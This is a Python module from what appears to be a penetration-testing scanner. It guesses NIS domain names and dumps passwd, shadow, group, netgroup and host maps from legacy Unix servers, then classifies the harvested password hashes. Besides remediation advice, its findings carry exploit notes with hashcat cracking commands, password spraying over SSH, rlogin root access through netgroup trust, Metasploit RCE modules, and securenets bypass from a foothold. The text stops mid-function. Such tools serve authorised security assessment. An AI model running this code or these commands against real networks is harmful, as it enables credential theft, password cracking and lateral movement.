"""NIS / YP (Sun Yellow Pages) — legacy-Unix credential-map exposure.

NIS is registered through rpcbind (111) and typically served on ephemeral ports:
ypserv is RPC program 100004, ypbind 100007, yppasswdd 100009, ypupdated 100028.
On legacy Solaris / HP-UX / AIX / IRIX estates the passwd.byname and passwd.byuid
maps still ship crypt(3) hashes (DES or $1$/$5$/$6$) that anyone who can name
the NIS domain can pull with ypcat and crack offline. The domain is the only
"auth" between the attacker and those hashes; it is very often the DNS domain,
the hostname suffix, a well-known default, or the SMB workgroup / Kerberos
realm lower-cased.

Three read-only reads, all AUTH_NULL:

  * **portmap DUMP (111 udp+tcp)** — name programs 100004/100007/100009/100028
    as ypserv/ypbind/yppasswdd/ypupdated instead of anonymous numeric IDs.
  * **YPPROC_DOMAIN (proc 1)** — probe a candidate domain against ypserv; a
    TRUE reply confirms the domain is served (no map access needed).
  * **YPPROC_MAPLIST (proc 11) + YPPROC_ALL (proc 8)** — enumerate every map
    in the domain and stream passwd.byname / passwd.byuid / shadow.byname /
    group.byname / netgroup / hosts.byname / ypservers back over TCP. Records
    are counted and byte-capped so a hostile server cannot exhaust memory.

recce never issues YPBINDPROC_SETDOM (ypset) or any yppasswdd change RPC —
those are write paths, out of scope.

Wire format: ONC RPC (RFC 1057) with AUTH_NULL. UDP for portmap DUMP + GETPORT
+ YPPROC_DOMAIN, TCP with record marking for YPPROC_ALL streaming.
"""
from __future__ import annotations

import re
import socket
import struct

from ..core import proxy
from ..core.models import Host, Port
from .svccommon import finding_builder, recvn as _recvn

_DEFAULT_PORT = 111
_TIMEOUT = 5.0

_PMAP_PROG, _PMAP_VERS = 100000, 2
_YPSERV_PROG, _YPSERV_VERS = 100004, 2
_YPBIND_PROG, _YPBIND_VERS = 100007, 2
_YPPASSWDD_PROG = 100009
_YPUPDATED_PROG = 100028

_IPPROTO_TCP = 6
_IPPROTO_UDP = 17

_YPPROC_DOMAIN = 1
_YPPROC_MATCH = 3
_YPPROC_ALL = 8
_YPPROC_MAPLIST = 11

_YP_TRUE = 1
_YP_NOMORE = 2

_MAX_LIST = 8192
_MAX_RECORD = 8 * 1024 * 1024
_MAX_FRAGMENTS = 128
_MAX_UDP = 65507                             # UDP payload cap (spec, also our recv cap)

# Common ypserv fixed ports seen on Solaris/HP-UX out in the wild — the
# authoritative source is portmap GETPORT, but a listing signature helps
# is_nis() light up when portmap itself is filtered.
_YPSERV_FIXED = (714, 717, 834)


def is_nis(port: Port) -> bool:
    if port.portid == 111 or port.portid in _YPSERV_FIXED:
        return True
    blob = f"{port.service} {port.product}".lower()
    return any(k in blob for k in ("ypserv", "ypbind", "yppasswdd",
                                   "ypupdated", "nis", "rpcbind", "portmap"))


# --- ONC RPC (RFC 1057) --------------------------------------------------------

def _pack_call(xid: int, prog: int, vers: int, proc: int, args: bytes = b"") -> bytes:
    """RPC CALL message with AUTH_NULL credentials and verifier."""
    return struct.pack(
        ">IIIIIIIIII",
        xid, 0,            # mtype = CALL
        2,                 # rpcvers
        prog, vers, proc,
        0, 0,              # cred: AUTH_NULL, length 0
        0, 0,              # verf: AUTH_NULL, length 0
    ) + args


def _xdr_pad(n: int) -> int:
    return (n + 3) & ~3


def _xdr_string(s: str) -> bytes:
    b = s.encode("utf-8", "replace")
    return struct.pack(">I", len(b)) + b + b"\x00" * (_xdr_pad(len(b)) - len(b))


class _Cur:
    """Bounds-checked XDR cursor."""
    __slots__ = ("b", "i")

    def __init__(self, b: bytes):
        self.b, self.i = b, 0

    def u32(self) -> int:
        if self.i + 4 > len(self.b):
            raise ValueError("XDR: short uint32")
        v = struct.unpack_from(">I", self.b, self.i)[0]
        self.i += 4
        return v

    def opaque(self) -> bytes:
        n = self.u32()
        if n > len(self.b) - self.i:
            raise ValueError("XDR: opaque length out of range")
        v = self.b[self.i:self.i + n]
        self.i += _xdr_pad(n)
        return v

    def string(self) -> str:
        return self.opaque().decode("utf-8", "replace")

    def remaining(self) -> int:
        return len(self.b) - self.i


def _parse_reply(data: bytes, want_xid: int) -> bytes | None:
    """Validate RPC REPLY / MSG_ACCEPTED / SUCCESS and return the payload."""
    try:
        xid, mtype, reply_stat = struct.unpack_from(">III", data, 0)
    except struct.error:
        return None
    if xid != want_xid or mtype != 1 or reply_stat != 0:
        return None
    i = 12
    try:
        _flavor, vlen = struct.unpack_from(">II", data, i)
    except struct.error:
        return None
    i += 8 + _xdr_pad(vlen)
    try:
        accept_stat = struct.unpack_from(">I", data, i)[0]
    except struct.error:
        return None
    i += 4
    if accept_stat != 0:
        return None
    return data[i:]


def _rpc_udp(ip: str, port: int, xid: int, prog: int, vers: int, proc: int,
             args: bytes, timeout: float) -> bytes | None:
    """One UDP RPC call → payload bytes, or None on any transport / RPC error."""
    body = _pack_call(xid, prog, vers, proc, args)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(proxy.scaled(timeout))
    try:
        try:
            sock.sendto(body, (ip, port))
            data, _addr = sock.recvfrom(_MAX_UDP)
        except OSError:
            return None
        return _parse_reply(data, xid)
    finally:
        try:
            sock.close()
        except OSError:
            pass


def _recv_record(sock: socket.socket, timeout: float) -> bytes | None:
    """Read one RPC record over TCP (record-marked fragments). Bounded on total
    size and fragment count."""
    sock.settimeout(proxy.scaled(timeout))
    out = b""
    for _ in range(_MAX_FRAGMENTS):
        hdr = _recvn(sock, 4, timeout)
        if hdr is None or len(hdr) < 4:
            return None
        marker = struct.unpack(">I", hdr)[0]
        last = bool(marker & 0x80000000)
        length = marker & 0x7FFFFFFF
        if length > _MAX_RECORD or len(out) + length > _MAX_RECORD:
            return None
        frag = _recvn(sock, length, timeout)
        if frag is None or len(frag) < length:
            return None
        out += frag
        if last:
            return out
    return None


def _rpc_tcp_send(sock: socket.socket, xid: int, prog: int, vers: int, proc: int,
                  args: bytes, timeout: float) -> bool:
    body = _pack_call(xid, prog, vers, proc, args)
    sock.settimeout(proxy.scaled(timeout))
    try:
        sock.sendall(struct.pack(">I", 0x80000000 | len(body)) + body)
        return True
    except OSError:
        return False


# --- portmap DUMP + GETPORT (UDP first, TCP fallback) --------------------------

def portmap_dump(ip: str, timeout: float = _TIMEOUT, pmport: int = 111) -> list[dict]:
    """PMAPPROC_DUMP over UDP, falling back to TCP. Returns [{prog,vers,prot,port}]."""
    data = _rpc_udp(ip, pmport, 0x2001, _PMAP_PROG, _PMAP_VERS, 4, b"", timeout)
    if data is None:
        data = _portmap_dump_tcp(ip, pmport, timeout)
    if data is None:
        return []
    cur = _Cur(data)
    out: list[dict] = []
    try:
        while len(out) < _MAX_LIST:
            if cur.u32() == 0:
                break
            prog, vers, prot, port = cur.u32(), cur.u32(), cur.u32(), cur.u32()
            out.append({"prog": prog, "vers": vers, "prot": prot, "port": port})
    except (ValueError, struct.error):
        pass
    return out


def _portmap_dump_tcp(ip: str, pmport: int, timeout: float) -> bytes | None:
    try:
        sock = socket.create_connection((ip, pmport), timeout=proxy.scaled(timeout))
    except OSError:
        return None
    try:
        if not _rpc_tcp_send(sock, 0x2001, _PMAP_PROG, _PMAP_VERS, 4, b"", timeout):
            return None
        rec = _recv_record(sock, timeout)
        if rec is None:
            return None
        return _parse_reply(rec, 0x2001)
    finally:
        try:
            sock.close()
        except OSError:
            pass


def getport(ip: str, prog: int, vers: int, prot: int = _IPPROTO_UDP,
            timeout: float = _TIMEOUT, pmport: int = 111) -> int:
    """PMAPPROC_GETPORT — over UDP. Returns the port, or 0."""
    args = struct.pack(">IIII", prog, vers, prot, 0)
    data = _rpc_udp(ip, pmport, 0x2002, _PMAP_PROG, _PMAP_VERS, 3, args, timeout)
    if data is None or len(data) < 4:
        return 0
    return struct.unpack_from(">I", data, 0)[0]


# --- YPPROC_DOMAIN / MAPLIST / ALL --------------------------------------------

def yp_domain(ip: str, port: int, domain: str,
              timeout: float = _TIMEOUT) -> bool:
    """YPPROC_DOMAIN (proc 1) — TRUE iff the server serves that domain."""
    data = _rpc_udp(ip, port, 0x3001, _YPSERV_PROG, _YPSERV_VERS,
                    _YPPROC_DOMAIN, _xdr_string(domain), timeout)
    if data is None or len(data) < 4:
        return False
    return struct.unpack_from(">I", data, 0)[0] == 1


def yp_maplist(ip: str, port: int, domain: str,
               timeout: float = _TIMEOUT) -> list[str]:
    """YPPROC_MAPLIST (proc 11) — every map name served in `domain`."""
    data = _rpc_udp(ip, port, 0x3002, _YPSERV_PROG, _YPSERV_VERS,
                    _YPPROC_MAPLIST, _xdr_string(domain), timeout)
    if data is None:
        return []
    cur = _Cur(data)
    try:
        if cur.u32() != _YP_TRUE:
            return []
        names: list[str] = []
        while len(names) < _MAX_LIST:
            if cur.u32() == 0:
                break
            names.append(cur.string())
        return names
    except (ValueError, struct.error):
        return []


def yp_all(ip: str, port: int, domain: str, mapname: str,
           timeout: float = _TIMEOUT,
           max_records: int = _MAX_LIST,
           max_bytes: int = _MAX_RECORD) -> list[tuple[str, str]]:
    """YPPROC_ALL (proc 8) — stream (key, value) pairs from `mapname` over TCP.

    ypserv sends a stream of RPC replies, each carrying one ypresp_all union:
    `{ bool more; if more: { ypstat, key, val } }`. The stream ends when
    `more == FALSE` or `ypstat != YP_TRUE`. Bounded on record count and total
    bytes so a hostile / very-large map cannot exhaust memory.
    """
    try:
        sock = socket.create_connection((ip, port), timeout=proxy.scaled(timeout))
    except OSError:
        return []
    try:
        args = _xdr_string(domain) + _xdr_string(mapname)
        xid = 0x3003
        if not _rpc_tcp_send(sock, xid, _YPSERV_PROG, _YPSERV_VERS,
                             _YPPROC_ALL, args, timeout):
            return []
        out: list[tuple[str, str]] = []
        total = 0
        while len(out) < max_records and total < max_bytes:
            rec = _recv_record(sock, timeout)
            if rec is None:
                break
            payload = _parse_reply(rec, xid)
            if payload is None:
                break
            total += len(payload)
            try:
                cur = _Cur(payload)
                more = cur.u32()
                if more == 0:
                    break
                stat = cur.u32()
                if stat != _YP_TRUE:
                    break
                key = cur.string()
                val = cur.string()
            except (ValueError, struct.error):
                break
            out.append((key, val))
        return out
    finally:
        try:
            sock.close()
        except OSError:
            pass


# --- getpwent + hash classification --------------------------------------------

# 13-char DES crypt: [./0-9A-Za-z]{13}
_DES_CRYPT = re.compile(r"^[./0-9A-Za-z]{13}$")
# $id$salt$hash — id ∈ {1,2a,2b,2y,5,6,y}
_MODULAR = re.compile(r"^\$(1|2a|2b|2y|5|6|y)\$")


def _hash_format(field: str) -> str:
    """Classify the second colon-field of a getpwent line.

    Returns:
      "" — locked / no-password / shadowed (`x` / `*` / `!` / empty)
      "des" — 13-char crypt(3) DES (Solaris ≤9 / HP-UX 11.11 / IRIX territory)
      "md5" — $1$…    "sha256" — $5$…    "sha512" — $6$…
      "blowfish" — $2a$ / $2b$ / $2y$    "yescrypt" — $y$
      "unknown" — non-empty but no shape we recognise (still worth surfacing)
    """
    if not field or field in ("x", "*", "!", "!!", "!*", "*LK*", "NP", "*NP*"):
        return ""
    m = _MODULAR.match(field)
    if m:
        return {"1": "md5", "5": "sha256", "6": "sha512",
                "2a": "blowfish", "2b": "blowfish", "2y": "blowfish",
                "y": "yescrypt"}[m.group(1)]
    if _DES_CRYPT.match(field):
        return "des"
    return "unknown"


def _parse_pw_line(line: str) -> dict | None:
    """Parse `name:hash:uid:gid:gecos:home:shell` — returns None if the shape
    is not a getpwent line at all."""
    parts = line.split(":")
    if len(parts) < 4:
        return None
    user = parts[0].strip()
    if not user or user.startswith("#"):
        return None
    return {
        "user": user,
        "hash": parts[1],
        "uid": parts[2],
        "gid": parts[3],
        "gecos": parts[4] if len(parts) > 4 else "",
        "home": parts[5] if len(parts) > 5 else "",
        "shell": parts[6] if len(parts) > 6 else "",
        "hash_format": _hash_format(parts[1]),
    }


# --- domain-name candidates ----------------------------------------------------

# Well-known / factory-default NIS domains. Deliberately short — a big list
# turns each host into a syslog-flooding brute force.
_DEFAULT_DOMAINS = ("nis", "nisdomain", "yp", "ypdomain", "sun", "default",
                    "localdomain")


def nis_domain_candidates(host: Host, extra: list[str] | None = None,
                          cap: int = 16) -> list[str]:
    """Ordered, de-duplicated candidate list for YPPROC_DOMAIN.

    Ordered `extra` (operator-supplied / cross-service context) first, then
    hostname suffixes / first labels, then the well-known defaults.
    """
    seen: set[str] = set()
    out: list[str] = []

    def add(name: str) -> None:
        n = (name or "").strip().strip(".").lower()
        if not n or n in seen or " " in n or "/" in n:
            return
        seen.add(n)
        out.append(n)

    for e in extra or ():
        add(e)
    for hn in host.hostnames:
        if "." in hn:
            add(hn.split(".", 1)[1])            # DNS suffix
            add(hn.split(".", 1)[0])            # short name
        else:
            add(hn)
    for d in _DEFAULT_DOMAINS:
        add(d)
    return out[:cap]


# --- probe ---------------------------------------------------------------------

# Every map recce will attempt to dump when a domain confirms. Ordered by
# credential-value so an early byte-budget cut-off still yields the passwd
# hashes.
_CRED_MAPS = ("passwd.byname", "passwd.byuid",
              "shadow.byname", "passwd.adjunct.byname")
_GROUP_MAPS = ("group.byname", "group.bygid")
_TRUST_MAPS = ("netgroup", "netgroup.byhost", "netgroup.byuser",
               "hosts.equiv")
_TOPO_MAPS = ("hosts.byname", "hosts.byaddr", "ypservers",
              "services.byname", "ethers.byname", "networks.byname")


def _classify_program(prog: int) -> str:
    return {_YPSERV_PROG: "ypserv", _YPBIND_PROG: "ypbind",
            _YPPASSWDD_PROG: "yppasswdd",
            _YPUPDATED_PROG: "ypupdated"}.get(prog, "")


def probe(ip: str, timeout: float = _TIMEOUT, pmport: int = 111,
          domain_hints: list[str] | None = None,
          host_hostnames: list[str] | None = None) -> dict:
    """Read-only NIS/YP fingerprint. Returns:
      {reachable, programs, nis_programs, ypserv_port, domain, maps,
       records: {mapname: [(key, val)]}, passwd_hashes: [dict],
       securenets, error}
    """
    out: dict = {"reachable": False, "programs": [], "nis_programs": {},
                 "domain": "", "maps": [], "records": {},
                 "passwd_hashes": [], "securenets": False}
    progs = portmap_dump(ip, timeout, pmport)
    if not progs:
        return out
    out["reachable"] = True
    out["programs"] = progs
    named: dict[str, list[dict]] = {}
    for p in progs:
        n = _classify_program(p["prog"])
        if n:
            named.setdefault(n, []).append(p)
    out["nis_programs"] = named
    if "ypserv" not in named:
        return out

    # Resolve ypserv's port — prefer UDP v2 (what YPPROC_DOMAIN needs).
    ypserv_port = 0
    for p in named["ypserv"]:
        if p["prot"] == _IPPROTO_UDP and p["port"]:
            ypserv_port = p["port"]
            if p["vers"] == 2:
                break
    if not ypserv_port:
        ypserv_port = getport(ip, _YPSERV_PROG, _YPSERV_VERS, _IPPROTO_UDP,
                              timeout, pmport)
    out["ypserv_port"] = ypserv_port
    if not ypserv_port:
        return out

    # Candidate-domain sweep.
    synth_host = Host(ip=ip, hostnames=list(host_hostnames or []))
    candidates = nis_domain_candidates(synth_host, extra=domain_hints)
    domain = ""
    for c in candidates:
        try:
            if yp_domain(ip, ypserv_port, c, timeout):
                domain = c
                break
        except OSError:
            continue
    out["candidates_tried"] = candidates
    if not domain:
        return out
    out["domain"] = domain

    # Map list.
    maps = yp_maplist(ip, ypserv_port, domain, timeout)
    out["maps"] = maps
    if not maps:
        return out

    # Dump interesting maps. If passwd.byname is listed but returns zero
    # records / a refusal, mark securenets so findings() emits the
    # partially-hardened medium instead of pretending we won.
    def _dump(name: str) -> list[tuple[str, str]]:
        if name not in maps:
            return []
        try:
            return yp_all(ip, ypserv_port, domain, name, timeout)
        except OSError:
            return []

    for name in _CRED_MAPS + _GROUP_MAPS + _TRUST_MAPS + _TOPO_MAPS:
        pairs = _dump(name)
        if pairs:
            out["records"][name] = pairs

    # Extract passwd hashes from the credential-bearing maps.
    hashes: list[dict] = []
    seen_users: set[str] = set()
    for name in _CRED_MAPS:
        for _key, val in out["records"].get(name, []):
            row = _parse_pw_line(val)
            if row is None or not row["hash_format"]:
                continue
            if row["user"] in seen_users:
                continue
            seen_users.add(row["user"])
            hashes.append(row)
    out["passwd_hashes"] = hashes

    # securenets: passwd.byname is listed, but zero records came back — the
    # server acknowledges the domain yet refuses map dumps from this source.
    if any(m in maps for m in _CRED_MAPS) and not hashes:
        out["securenets"] = True

    return out


# --- targets + findings --------------------------------------------------------

def nis_targets(hosts: list[Host]) -> list[dict]:
    seen, out = set(), []
    for h in hosts:
        if h.ip in seen:
            continue
        if any(is_nis(p) for p in h.open_ports):
            seen.add(h.ip)
            out.append({"ip": h.ip, "hostname": h.hostname, "port": 111})
    return out


_NARRATIVE = {
    "nis_passwd_hashes": (
        "NIS passwd/shadow maps returned hashed passwords to an unauthenticated "
        "reader. The maps are gated only by the NIS domain name (which the "
        "scanner just guessed). Hashes are crypt(3) — 13-char DES on legacy "
        "Solaris/HP-UX/IRIX is offline-crackable in minutes on any modern GPU; "
        "$1$/$5$/$6$ takes longer but is the SAME credential a user has on "
        "every host that shares this NIS map (typically SSH, telnet, "
        "rlogin/rsh, SMB, FTP across the estate). Restrict ypserv with "
        "/var/yp/securenets to management subnets only, migrate off NIS to "
        "LDAP/Kerberos, and expire every hash exposed by this dump."),
    "nis_group_hashes": (
        "NIS group.byname / group.bygid enumerate the site's privilege graph — "
        "who is in wheel/sudo/adm/sys. Cracking a passwd hash for one of those "
        "members yields interactive root on any host that trusts the map."),
    "nis_netgroup_trust": (
        "NIS netgroup entries are (host, user, domain) triples used by "
        "/etc/exports, /etc/hosts.equiv, .rhosts and NFS export ACLs. A "
        "netgroup that names 'root' or '-' as user is a lateral-movement "
        "primitive: any host in that netgroup logs in as that user without a "
        "password on any host that trusts the netgroup."),
    "nis_topology_leak": (
        "NIS hosts.byname / hosts.byaddr / ypservers / ethers.byname enumerate "
        "the internal IP + MAC + hostname topology, including NIS slave "
        "servers (each answers the same domain with the same maps and is "
        "another dumper target — useful for working around securenets from a "
        "different source IP)."),
    "nis_maplist": (
        "The NIS server confirmed the domain and listed every map served in "
        "it. The list itself tells the operator which credential-bearing "
        "follow-on dumps to attempt (passwd.byname, shadow.byname, "
        "netgroup, ...)."),
    "nis_domain_leak": (
        "ypserv acknowledged the NIS domain name (YPPROC_DOMAIN returned "
        "TRUE) but refused map dumps from this source IP — /var/yp/securenets "
        "is limiting who may pull the maps. Re-run the map dumps from a host "
        "inside the securenets range (e.g. after gaining a foothold on any "
        "NIS client) to confirm the credential exposure."),
    "nis_yppasswdd": (
        "rpc.yppasswdd (RPC program 100009) accepts password-change RPCs. "
        "Historical implementations validate only the OLD password before "
        "writing the new one — trivially chainable with any hash cracked from "
        "the passwd map dump (CVE-2001-0779 buffer overflow class, "
        "CVE-2015-1391 Solaris)."),
    "nis_ypupdated": (
        "rpc.ypupdated (RPC program 100028) is registered. Historically this "
        "daemon has been an unauthenticated remote-command-execution vector "
        "via a crafted map name interpolated into a shell (CVE-1999-0208 "
        "class). recce did NOT invoke it."),
    "nis_rpc_names": (
        "The portmapper (111) advertises NIS RPC programs (ypserv / ypbind / "
        "yppasswdd / ypupdated) by number. Naming them lifts the generic "
        "'RPC services enumerable' finding to a specific 'NIS master "
        "reachable' one — the domain-guess + map-dump chain is the follow-up."),
    "nis_hash_age": (
        "13-char DES crypt hashes in the NIS passwd map indicate a Solaris "
        "≤ 9 / HP-UX 11.11 / IRIX host — every one of those OS releases is "
        "past end-of-support. Crack effort is minutes on modern hardware."),
}


TESTING_NARRATIVE = [
    ("1. RPC directory (stdlib ONC RPC over UDP+TCP)",
     "recce speaks Sun RPC directly. It dumps portmapper (111) and names "
     "programs 100004/100007/100009/100028 as ypserv/ypbind/yppasswdd/"
     "ypupdated, rather than leaving them as anonymous numeric IDs."),
    ("2. Domain-name guess",
     "The NIS domain is the only auth between the tester and the credential "
     "maps. recce probes YPPROC_DOMAIN with a bounded candidate list built "
     "from the target's hostnames and well-known defaults, plus any hints "
     "the operator or another module (LDAP, Kerberos, SMB) provides."),
    ("3. Map enumeration + credential dump",
     "On a domain hit, YPPROC_MAPLIST enumerates every map served, then "
     "YPPROC_ALL streams passwd.byname/passwd.byuid/shadow.byname over TCP. "
     "getpwent lines are parsed and the hash field classified (DES / "
     "$1$MD5 / $5$SHA-256 / $6$SHA-512 / $2$bcrypt / $y$yescrypt)."),
    ("4. Trust and topology",
     "group.byname reveals privilege membership (wheel/sudo/adm/sys); "
     "netgroup maps reveal the host-to-host and user-to-host trust graph "
     "(NFS export ACLs, hosts.equiv); hosts.byname / ypservers reveal the "
     "internal topology and every NIS slave (another map source)."),
    ("5. securenets discrimination",
     "A YPPROC_DOMAIN TRUE with an empty YPPROC_ALL reply means "
     "/var/yp/securenets is limiting who may pull the maps — a medium "
     "finding telling the operator to re-run from inside the range."),
]


_finding = finding_builder("nisyp", _NARRATIVE)


def _sample_users(hashes: list[dict], n: int = 6) -> str:
    users = [h["user"] for h in hashes[:n]]
    return ", ".join(users)


def _format_counts(hashes: list[dict]) -> str:
    counts: dict[str, int] = {}
    for h in hashes:
        counts[h["hash_format"]] = counts.get(h["hash_format"], 0) + 1
    return ", ".join(f"{v} {k}" for k, v in sorted(counts.items()))


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        pr = probes.get(h.ip)
        if not pr or not pr.get("reachable"):
            continue
        tgt = f"{h.ip}:111"
        named = pr.get("nis_programs") or {}

        # Passive: named NIS programs on the portmap.
        if named:
            names = sorted(named)
            out.append(_finding(
                "low", "NIS RPC programs registered on rpcbind", tgt,
                f"portmapper (111) advertises: {', '.join(names)}. NIS master "
                "reachable — the domain-guess + map-dump chain is the follow-up.",
                "rpcinfo",
                f"rpcinfo -p {h.ip}",
                "Firewall rpcbind (111) to management hosts; disable ypserv "
                "if the site has migrated to LDAP/Kerberos.",
                ["CWE-200"], kind="nis_rpc_names",
                exploit_note=(
                    "rpcinfo -p <ip>; note ports for 100004 (ypserv) and "
                    "100009 (yppasswdd); recce auto-continues to domain "
                    "guess."),
                depth_tier="t0"))

        # yppasswdd / ypupdated presence.
        if "yppasswdd" in named:
            out.append(_finding(
                "medium", "rpc.yppasswdd registered (accepts password-change RPCs)",
                tgt,
                "RPC program 100009 (yppasswdd) is registered. Chains with any "
                "hash cracked from the passwd map dump — the write path from a "
                "cracked hash to a live account.",
                "yppasswd",
                f"yppasswd -h {h.ip} <user>   # do NOT run without ROE",
                "Disable yppasswdd if password changes are handled elsewhere; "
                "patch to a version past CVE-2001-0779 / CVE-2015-1391.",
                ["CWE-284", "CWE-306"], kind="nis_yppasswdd",
                exploit_note=(
                    "rpcinfo -p <ip>; searchsploit yppasswdd; PoC only in "
                    "a lab: metasploit auxiliary/dos/rpc/yppasswdd "
                    "(crashes it)."),
                depth_tier="t0"))
        if "ypupdated" in named:
            out.append(_finding(
                "high",
                "rpc.ypupdated registered (historical unauth RCE, CVE-1999-0208 class)",
                tgt,
                "RPC program 100028 (rpc.ypupdated) is registered. Historical "
                "implementations shell-interpolate the map name — an unauthenticated "
                "remote command-execution vector. recce did NOT invoke it.",
                "rpcinfo",
                f"rpcinfo -p {h.ip}   # confirm 100028 and its port",
                "Disable rpc.ypupdated. There is no non-EOL fix on the affected "
                "SunOS/Solaris releases.",
                ["CWE-77", "CWE-306"], kind="nis_ypupdated",
                exploit_note=(
                    "rpcinfo -p <ip>; MSF exploit/solaris/misc/ypupdated_exec "
                    "target=<ip> — RCE as root on SunOS 4.x/Solaris 2.x; "
                    "ONLY IN LAB."
                ),
                depth_tier="t0"))

        domain = pr.get("domain") or ""
        maps = pr.get("maps") or []
        hashes = pr.get("passwd_hashes") or []

        # Map list (domain confirmed).
        if domain and maps:
            interesting = [m for m in maps
                           if m in _CRED_MAPS + _GROUP_MAPS + _TRUST_MAPS]
            out.append(_finding(
                "medium" if interesting else "low",
                f"NIS domain '{domain}' confirmed — {len(maps)} maps enumerable",
                tgt,
                f"YPPROC_MAPLIST returned {len(maps)} map name(s); "
                f"credential/trust maps present: "
                f"{', '.join(interesting) if interesting else '(none)'}.",
                "ypcat",
                f"ypcat -d {domain} -h {h.ip} passwd",
                "Restrict ypserv with /var/yp/securenets; migrate off NIS.",
                ["CWE-200"], kind="nis_maplist",
                exploit_note=(
                    "ypcat -d <domain> -h <ip> -x; then per-map: ypcat -d "
                    "<domain> -h <ip> <map>."),
                depth_tier="t1"))

        # Critical: passwd hashes.
        if hashes:
            counts = _format_counts(hashes)
            sample = _sample_users(hashes)
            has_des = any(h["hash_format"] == "des" for h in hashes)
            out.append(_finding(
                "critical",
                "NIS passwd map exposes hashed passwords",
                tgt,
                f"YPPROC_ALL on the passwd map(s) in NIS domain '{domain}' "
                f"returned {len(hashes)} account(s) with a hashed password "
                f"({counts}). Sample users: {sample}. Every hash is reusable "
                f"as a spray candidate against SSH / telnet / rlogin / SMB / "
                f"FTP across the estate once cracked. recce recorded the "
                f"hashes in the credentials store — the raw hashes are NOT "
                f"written to the findings JSON.",
                "ypcat + hashcat",
                f"ypcat -d {domain} -h {h.ip} passwd > loot/nis-{domain}.pw ; "
                f"hashcat -m 1500 loot/nis-{domain}.pw wordlist.txt   "
                f"# -m 1500 DES, 500 md5crypt, 7400 sha256, 1800 sha512",
                "Migrate off NIS; if that is not immediate, restrict ypserv to "
                "management subnets via /var/yp/securenets and expire every "
                "account whose hash was in the dump.",
                ["CWE-522", "CWE-256", "CWE-319"], kind="nis_passwd_hashes",
                exploit_note=(
                    "ypcat -d <domain> -h <ip> passwd > loot/nis.pw; hashcat "
                    "-m 1500 (DES) / -m 500 (md5crypt) / -m 7400 (sha256crypt) "
                    "/ -m 1800 (sha512crypt) loot/nis.pw rockyou.txt; nxc ssh "
                    "<estate_ips> -u loot/users.txt -p loot/cracked.txt."
                ),
                depth_tier="t3"))
            if has_des:
                out.append(_finding(
                    "medium",
                    "NIS passwd map contains 13-char DES crypt hashes (EOL OS)",
                    tgt,
                    "One or more passwd entries use the 13-char DES crypt "
                    "format. That format was replaced by $1$/$5$/$6$ on every "
                    "current Unix — its presence indicates a Solaris ≤ 9 / "
                    "HP-UX 11.11 / IRIX NIS master, all past end-of-support.",
                    "hashcat",
                    f"hashcat -m 1500 loot/nis-{domain}.pw wordlist.txt",
                    "Retire the EOL OS or force an OS-side reset onto a "
                    "modern crypt scheme.",
                    ["CWE-327", "CWE-1104"], kind="nis_hash_age",
                    exploit_note=(
                        "hashcat -m 1500 -a 0 loot/nis-des.pw rockyou.txt "
                        "-O -w 4  # DES cracks in minutes."),
                    depth_tier="t1"))

        # Group + netgroup.
        group_recs = (pr.get("records") or {}).get("group.byname", [])
        priv_groups = [k for k, v in group_recs
                       if k.split(":", 1)[0] in ("wheel", "sudo", "adm", "sys",
                                                 "root", "bin")]
        if group_recs:
            out.append(_finding(
                "high" if priv_groups else "medium",
                "NIS group map exposes membership (privileged groups named)",
                tgt,
                f"group.byname returned {len(group_recs)} entr(ies)"
                + (f"; privileged groups present: {', '.join(sorted(set(priv_groups)))}"
                   if priv_groups else "") + ".",
                "ypcat",
                f"ypcat -d {domain} -h {h.ip} group",
                "Restrict ypserv (securenets) or migrate off NIS.",
                ["CWE-522", "CWE-732"], kind="nis_group_hashes",
                exploit_note=(
                    "ypcat -d <domain> -h <ip> group | grep -E "
                    "'^(wheel|sudo|adm|root):'; then hashcat prioritized on "
                    "those users' hashes."
                ) if priv_groups else "",
                depth_tier="t1" if priv_groups else ""))

        netgroup_recs = (pr.get("records") or {}).get("netgroup", [])
        trust_hits = [(k, v) for k, v in netgroup_recs
                      if "root" in v or ",-," in v]
        if netgroup_recs:
            out.append(_finding(
                "high" if trust_hits else "medium",
                "NIS netgroup map reveals host-to-host / user-to-host trust",
                tgt,
                f"netgroup returned {len(netgroup_recs)} entr(ies)"
                + (f"; entries granting 'root' or '-' (any user) trust: "
                   f"{len(trust_hits)} (e.g. {trust_hits[0][0]})"
                   if trust_hits else "") + ".",
                "ypcat",
                f"ypcat -d {domain} -h {h.ip} netgroup",
                "Audit /etc/exports / /etc/hosts.equiv / .rhosts users of the "
                "leaked netgroups; migrate off NIS trust.",
                ["CWE-284", "CWE-269"], kind="nis_netgroup_trust",
                exploit_note=(
                    "For each netgroup granting root/-: rlogin -l root "
                    "<host_in_netgroup>; rsh <host_in_netgroup> 'id'  # if "
                    "trust wired via .rhosts/hosts.equiv this returns a shell."
                ) if trust_hits else "",
                depth_tier="t1" if trust_hits else ""))

        # Topology leak.
        topo_recs: list[str] = []
        for m in _TOPO_MAPS:
            if (pr.get("records") or {}).get(m):
                topo_recs.append(m)
        if topo_recs:
            hosts_by_name = (pr.get("records") or {}).get("hosts.byname", [])
            ypservers = (pr.get("records") or {}).get("ypservers", [])
            out.append(_finding(
                "medium",
                "NIS topology maps leak internal hosts / ypservers",
                tgt,
                f"Non-credential maps returned data: {', '.join(topo_recs)}. "
                f"hosts.byname entries: {len(hosts_by_name)}; ypservers "
                f"entries: {len(ypservers)} (each is another map source that "
                f"may not enforce the same securenets).",
                "ypcat",
                f"ypcat -d {domain} -h {h.ip} hosts",
                "Restrict ypserv (securenets); migrate topology data off NIS.",
                ["CWE-200"], kind="nis_topology_leak",
                exploit_note=(
                    "ypcat -d <domain> -h <ip> ypservers; then re-run "
                    "nisyp probe against each slave server — may bypass "
                    "securenets ACL of the master."),
                depth_tier="t1"))

        # securenets partial hardening.
        if pr.get("securenets"):
            out.append(_finding(
                "medium",
                "NIS domain leaks but map dumps refused (securenets partially applied)",
                tgt,
                f"ypserv acknowledged the NIS domain '{domain}' but YPPROC_ALL "
                "on the passwd map returned no records. /var/yp/securenets is "
                "limiting which source IPs may pull the maps. Re-run from a "
                "host inside the securenets range.",
                "ypcat",
                f"ypcat -d {domain} -h {h.ip} passwd   "
                "# retry from an in-range client after foothold",
                "Complete the hardening — restrict YPPROC_DOMAIN as well "
                "(ypserv -i / securenets ACL on the ypbind side) so the "
                "domain name itself does not leak.",
